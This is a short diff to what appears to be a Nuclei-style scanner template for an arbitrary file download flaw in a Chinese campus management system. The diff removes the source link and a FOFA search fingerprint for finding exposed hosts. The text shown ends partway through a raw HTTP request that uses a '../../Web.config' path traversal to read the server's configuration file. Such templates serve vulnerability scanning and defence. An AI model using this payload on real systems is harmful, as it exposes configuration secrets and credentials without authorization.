@@ -3,12 +3,8 @@ info:
   name: 智慧校园(安校易)管理系统 FileDownLoad.ashx 存在任意文件下载漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/tboigo4v3pyqpxs5'
+  description: ''
   tags: lfi,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: tboigo4v3pyqpxs5
-    fofa: title="智慧综合管理平台登入"
 http:
 - raw:
   - 'GET /Module/FileManagement/FileDownLoad.aspx?filePath=../../Web.config&fileName=Web.config HTTP/1.1
